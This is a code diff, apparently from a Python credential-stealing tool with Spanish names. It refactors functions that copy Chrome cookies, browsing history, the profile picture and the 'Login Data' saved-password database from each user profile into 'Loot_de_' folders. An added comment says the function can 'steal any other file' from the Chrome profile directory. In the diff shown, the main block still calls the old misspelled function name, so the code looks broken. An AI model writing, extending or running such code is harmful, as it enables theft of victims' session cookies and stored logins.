@@ -20,7 +20,7 @@ def rutas_cookie():
         users_cookie_path.append(i)
     return users_cookie_path
 
-def obtener_coockies(paths):
+def obtener_cookies(paths):
     loot_paths = []
     paths2  = []
     for i in paths:
@@ -33,28 +33,17 @@ def obtener_coockies(paths):
             shutil.rmtree(i)
     except FileNotFoundError: pass
     for i in range(len(loot_paths)):
-        shutil.copytree(paths2[i], f'{loot_paths[i]}\\coockies')
+        shutil.copytree(paths2[i], f'{loot_paths[i]}\\cookies')
 
-def profile_picture(paths):
+# You can steal any other file from this folder C:\Users\(USERNAME)\AppData\Local\Google\Chrome\User Data\(ProfileName) just calling this function
+def other_File(paths, nameChrome, saveName):
     for i in range(len(profiles)):
         try:
-            shutil.copyfile(f'{paths[i]}\\Google Profile Picture.png', f'Loot_de_{profiles[i]}\\Foto_perfil.png')
+            shutil.copyfile(f'{paths[i]}\\{nameChrome}', f'Loot_de_{profiles[i]}\\{saveName}')
         except FileNotFoundError: pass
-    
-def history(paths):
-    for i in range(len(paths)):
-        try:
-            shutil.copyfile(f'{paths[i]}\\History', f'Loot_de_{profiles[i]}\\Historial.db')
-        except FileNotFoundError: pass
-
-def login_data(paths):
-    for i in range(len(paths)):
-            try:
-                shutil.copyfile(f'{paths[i]}\\Login Data', f'Loot_de_{profiles[i]}\\Datos_login.db')
-            except FileNotFoundError: pass
 
 if __name__ == '__main__':
     obtener_coockies(rutas_cookie())
-    profile_picture(rutas_cookie())
-    history(rutas_cookie())
-    login_data(rutas_cookie())
+    other_File(rutas_cookie(), 'Google Profile Picture.png', 'Foto_perfil.png')
+    other_File(rutas_cookie(), 'History', 'Historial.db')
+    other_File(rutas_cookie(), 'Login Data', 'Datos_login.db')
